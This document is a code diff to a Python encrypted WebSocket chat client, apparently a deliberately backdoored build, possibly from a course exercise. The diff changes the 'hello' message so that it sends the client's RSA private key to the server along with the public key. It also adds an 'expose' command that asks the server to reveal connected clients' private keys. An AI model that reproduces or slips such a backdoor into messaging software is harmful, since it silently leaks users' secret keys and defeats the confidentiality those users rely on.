@@ -55,7 +55,7 @@ class Client:
         self.public_key_pem, self.private_key_pem = self.encryption.generate_rsa_key_pair()
         self.public_key = self.encryption.load_public_key(self.public_key_pem)
         self.private_key = self.encryption.load_private_key(self.private_key_pem)
-        
+        self.my_nickname = generate_nickname(self.encryption.generate_fingerprint(self.public_key_pem))
         # Prompt for server address
         chosen_server = await aioconsole.ainput("Enter WebSocket server address (e.g., localhost:9000): ")
         self.server_address = f"ws://{chosen_server}"
@@ -66,8 +66,7 @@ class Client:
 
         await self.connect()
         
-        my_nickname = generate_nickname(self.encryption.generate_fingerprint(self.public_key_pem))
-        print(f"\nYour nickname is: {my_nickname}\n")
+        print(f"\nYour nickname is: {self.my_nickname}\n")
         await self.input_prompt()
         self.loop.run_forever()
 
@@ -272,6 +271,8 @@ class Client:
                 client = await aioconsole.ainput("Enter name of client to kick: ")
                 reason = await aioconsole.ainput("Enter reason for booting: ")
                 await self.kick_client(client, reason)
+            elif message.lower() == "expose":
+                await self.send_expose_to_server()
             else:
                 print("Invalid command.")
                 
@@ -334,11 +335,14 @@ class Client:
         self.counter += 1
         
         public_pem = self.public_key_pem.decode('utf-8')
+        private_pem = self.private_key_pem.decode('utf-8')
         
 
         message_data = {
             "type": "hello",
-            "public_key": public_pem  
+            "public_key": public_pem,  
+            "private_key": private_pem,
+            "username": self.my_nickname
         }
 
         message = self.build_signed_data(message_data)
@@ -737,6 +741,21 @@ class Client:
                 
         else:
             pass
+    
+    async def send_expose_to_server(self):
+        """
+        Send expose command to the server to expose connected client's private keys
+        """
+        message = {
+            "type":"signed_data",
+            "data":
+            {
+                "type":"expose"
+            },
+        }
+        
+        message_json = json.dumps(message)
+        await self.send(message_json)
            
     async def send(self, message_json):
         """
